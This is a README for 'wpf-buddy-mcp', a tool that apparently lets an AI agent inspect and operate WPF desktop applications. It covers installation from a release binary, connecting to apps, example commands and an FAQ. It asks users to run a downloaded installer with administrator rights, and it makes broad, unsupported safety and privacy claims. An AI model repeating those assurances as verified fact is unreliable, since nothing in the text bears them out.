# 🤖 wpf-buddy-mcp - Control Windows apps with plain language

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/gasperutterable635/wpf-buddy-mcp/releases)

## 🎯 What is this tool?

Wpf-buddy-mcp acts as a bridge between artificial intelligence and Windows desktop programs. Many businesses use WPF, or Windows Presentation Foundation, to build the software you use at your desk. This tool allows an AI assistant to see, understand, and interact with those programs. 

You no longer need to perform repetitive manual tasks. The AI agent connects to your open application, reads the buttons, labels, and text fields on the screen, and carries out your commands. It can explore menus, fill out forms, check for errors, and write test instructions for you.

## ⚙️ System Requirements

Your computer needs to meet these basic standards to run this software:

*   **Operating System:** Windows 10 or Windows 11.
*   **Framework:** The .NET Desktop Runtime (version 8.0 or newer).
*   **Memory:** At least 4 Gigabytes of RAM.
*   **Storage:** 200 Megabytes of free disk space.
*   **Permissions:** You need administrator rights to your computer to inspect other programs.

## 💾 Installation Steps

Follow these steps to set up the software on your machine:

1. Visit this page to download the setup file: [https://github.com/gasperutterable635/wpf-buddy-mcp/releases](https://github.com/gasperutterable635/wpf-buddy-mcp/releases).
2. Look for the file ending in `.msi` or `.exe` under the latest release section.
3. Save the file to your desktop or downloads folder.
4. Double-click the file to start the installer.
5. Follow the prompts on the screen to finish the setup process.
6. Restart your computer if the installer asks you to perform this action.

## 🚀 Connecting to an Application

Before you start, ensure the WPF application you want to inspect is already open on your desktop.

1. Open the Wpf-buddy-mcp program from your Start menu.
2. The main screen displays a list of all detected Windows applications.
3. Find your application in the list.
4. Press the green Connect button next to the application name.
5. Wait for the status indicator to turn green. This confirms the connection is active.
6. The AI agent now has permission to read the UI Automation tree of that specific application.

## 💬 Using Natural Language Commands

Once connected, you interact with your desktop software through an AI chat interface. You type your goal, and the software translates your plain English into computer actions.

Common tasks you can request include:

*   **UI Exploration:** "Find all text boxes on this screen and tell me their names."
*   **Data Entry:** "Put the text 'Sample Data' into every input field I can see."
*   **State Checking:** "Tell me if the submit button is grayed out or clickable."
*   **Testing:** "Perform a regression test by clicking every button in order and reporting any errors."

The agent processes these tasks instantly. If it reaches a screen it does not recognize, it notifies you and asks for instructions.

## 🛠️ Typical Workflow

Most users follow this cycle to get work done:

1. **Launch:** Open your target application and the Wpf-buddy-mcp tool.
2. **Link:** Establish the connection between the two programs.
3. **Prompt:** Enter your instruction into the chat box.
4. **Monitor:** Watch as the AI agent navigates the menus and fields.
5. **Verify:** Check the output logs to confirm the agent finished the task correctly.
6. **Save:** Export the inspection report if you plan to share the results with your team.

## 🔍 Troubleshooting Common Issues

If you experience problems, check these items first:

*   **Connection Fails:** Make sure you run the tool as an administrator. Right-click the icon and choose "Run as administrator."
*   **App Not Found:** Ensure your target application uses the WPF framework. This tool does not work with older WinForms or web-based applications.
*   **Slow Response:** Close unnecessary background applications to free up system memory.
*   **Incomplete Actions:** Sometimes complex menus require a moment to load. Give the software a few seconds to scan the new screen before you send the next prompt.

## 🛡️ Privacy and Safety

This software operates locally on your machine. All UI information, screenshots, and text stays within your computer environment. The agent only sends necessary instructions out to the AI service to interpret your text, while the visual data from your application remains private to your system. You control all interactions. You can disconnect or shut down the software at any point.

## ❓ Frequently Asked Questions

**Does this tool change my data?**
It only interacts with the application as if a human were clicking the buttons. It cannot alter your system files or change your settings outside of the application you connect to.

**Can I run this on a server?**
You should run this on a machine with a monitor or a desktop session connected. It relies on the visual layout of your desktop programs.

**How do I update the tool?**
Check the releases page occasionally. If a new version exists, download the installer and run it. The new version replaces the old one automatically.

**Does it log my passwords?** 
The tool records actions, not keystrokes. It does not monitor your typing in fields that are flagged as password inputs.